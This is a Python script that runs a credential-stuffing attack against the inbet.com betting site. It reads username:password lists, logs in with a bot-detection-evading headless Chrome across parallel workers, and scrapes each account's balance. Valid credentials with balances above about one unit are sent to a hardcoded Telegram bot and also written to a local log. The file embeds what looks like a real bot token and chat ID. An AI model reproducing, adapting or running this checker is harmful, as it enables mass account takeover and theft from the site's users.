# file: winbet_balance_checker.py

import winsound
import re
import tkinter as tk
from tkinter import messagebox
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from datetime import datetime
import undetected_chromedriver as uc
import time
import traceback
import os
from concurrent.futures import ThreadPoolExecutor
import threading
import keyboard
import requests
import multiprocessing

stop_flag = False
max_workers = 10
headless_mode = True

# ==================== CONFIG ====================
TELEGRAM_BOT_TOKEN = "8261371308:AAEzFjN1Ufsr8yI6iY08gMLo5Va55lO_Guo"
TELEGRAM_CHAT_ID = "7752036982"
# =================================================

def emergency_stop_listener():
    global stop_flag
    buffer = []
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN and event.name == 's':
            buffer.append(time.time())
            buffer = [t for t in buffer if time.time() - t < 3]
            if len(buffer) >= 5:
                print("\n[EMERGENCY STOP] 's' pressed 5 times. Stopping script.")
                stop_flag = True
                os._exit(0)

def read_credentials(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        credentials = file.readlines()
    return [line.strip().split(':') for line in credentials]

def init_driver(block_images=True):
    """Initialize undetected Chrome driver."""
    options = uc.ChromeOptions()
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--log-level=3")
    options.add_argument("--disable-blink-features=AutomationControlled")

    if headless_mode:
        options.add_argument("--headless=new")

    if block_images:
        prefs = {"profile.managed_default_content_settings.images": 2}
        options.add_experimental_option("prefs", prefs)

    version_main = 142
    driver = uc.Chrome(options=options, version_main=version_main)
    driver.set_window_size(1920, 1080)
    return driver

def send_telegram(username, password, balance, timestamp):
    try:
        message = (
            f"🚨Inbet Balance Alert!\n"
            f"User: {username}:{password}\n"
            f"Balance: {balance}\n"
            f"Time: {timestamp}"
        )
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
        requests.post(url, data=payload)
        print(f"[TELEGRAM] Alert sent for {username}:{password} with balance {balance}")
    except Exception as e:
        print(f"[ERROR] Failed to send Telegram message: {e}")

def login(credentials):
    username, password = credentials
    driver = init_driver()
    try:
        driver.get(login_page_url)
        wait = WebDriverWait(driver, 30)

        try:
            allow_all_btn = wait.until(
                EC.presence_of_element_located(
                    (By.ID, "CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll")
                )
            )
            try:
                allow_all_btn.click()
            except Exception:
                # Fallback: force click if normal click fails
                driver.execute_script("arguments[0].click();", allow_all_btn)
        except Exception:
            print(f"[WARNING] 'Allow All Cookies' button not found for {username}. Continuing...")
            
        try:
            login_button = wait.until(
                EC.element_to_be_clickable((By.XPATH, "/html/body/div[3]/div[2]/div/nav/div/div/div[3]/div/button[2]"))
            )
            driver.execute_script("arguments[0].click();", login_button)
        except:
            print(f"[ERROR] Login button not found for {username}.")
            return

        try:
            username_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "//input[@name='username' or contains(@placeholder,'Потребител')]")
                )
            )
            username_field.send_keys(username)
        except Exception:
            print(f"[ERROR] Username field not found for {username}.")
            return

        try:
            password_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "//input[@type='password']")
                )
            )
            password_field.send_keys(password)
        except Exception:
            print(f"[ERROR] Password field not found for {username}.")
            return

        try:
            submit_button = wait.until(
                EC.element_to_be_clickable(
                    (By.XPATH, "//form//button[contains(@class,'btn') and not(@disabled)]")
                )
            )
            submit_button.click()
        except Exception:
            print(f"[ERROR] Submit button not found for {username}.")
            return

        formatted_amount = '0.00'
        balance_found = False
        time.sleep(50)
        try:
            success_elm = wait.until(
                EC.visibility_of_element_located(
                    (By.CSS_SELECTOR, "div.d-flex-as-je.nav-user.nav-user__logged-in")
                )
            )
            success_text = success_elm.text
            amount_match = re.search(r'\d+(?:[.,]\d+)?', success_text)
            if amount_match:
                amount_str = amount_match.group().replace(',', '.')
                try:
                    amount = float(amount_str)
                    formatted_amount = f"{amount:.2f}"
                    balance_found = True
                except ValueError:
                    pass
        except Exception:
            print(f"[INFO] Balance element NOT found for {username}.")

        balance_value = float(formatted_amount.replace(',', '.'))
        if balance_value > 0.99:
            try:
                winsound.PlaySound(r"C:\Users\petar\Desktop\inbet\inbet.wav",
                                   winsound.SND_FILENAME | winsound.SND_ASYNC)
            except:
                print("[WARNING] Could not play sound.")
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            send_telegram(username, password, formatted_amount, timestamp)

        if balance_found:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(success_logins_file, 'a', encoding='utf-8') as file:
                file.write(f"[{timestamp}] {username}:{password} - Balance: {formatted_amount}\n")

    except Exception:
        traceback.print_exc()
    finally:
        driver.quit()

def config_popup():
    """Popup window for user configuration."""
    def on_submit():
        global max_workers, headless_mode
        try:
            max_workers = int(entry_workers.get())
            headless_mode = bool(headless_var.get())
            if max_workers < 1:
                raise ValueError
            root.destroy()
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid number for max_workers.")

    root = tk.Tk()
    root.title("WinBet Config")

    tk.Label(root, text="Set Max Workers:").pack(pady=5)
    entry_workers = tk.Entry(root)
    entry_workers.insert(0, "10")
    entry_workers.pack(pady=5)

    headless_var = tk.IntVar(value=1)
    tk.Checkbutton(root, text="Run Headless", variable=headless_var).pack(pady=5)

    tk.Button(root, text="Start", command=on_submit, bg="#4CAF50", fg="white").pack(pady=10)
    root.mainloop()

def main():
    global login_page_url, success_logins_file, stop_flag
    config_popup()

    credentials_file = 'unique.txt'
    success_logins_file = r"C:\Users\petar\Desktop\inbet\balance_and_bets_sounds.txt"
    os.makedirs(os.path.dirname(success_logins_file), exist_ok=True)

    login_page_url = "https://www.inbet.com/sports"
    credentials = read_credentials(credentials_file)

    listener_thread = threading.Thread(target=emergency_stop_listener, daemon=True)
    listener_thread.start()

    print(f"[INFO] Starting with {max_workers} workers (headless={headless_mode})...")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(lambda cred: login(cred), credentials)

if __name__ == "__main__":
    main()
